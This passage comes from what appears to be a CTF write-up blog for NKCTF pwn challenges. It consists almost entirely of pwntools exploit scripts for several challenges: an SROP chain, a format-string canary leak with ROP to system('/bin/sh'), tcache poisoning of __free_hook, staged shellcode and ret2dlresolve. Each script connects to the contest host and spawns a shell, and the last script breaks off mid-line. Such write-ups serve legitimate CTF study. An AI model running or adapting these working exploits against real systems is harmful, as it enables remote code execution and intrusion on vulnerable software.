class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span 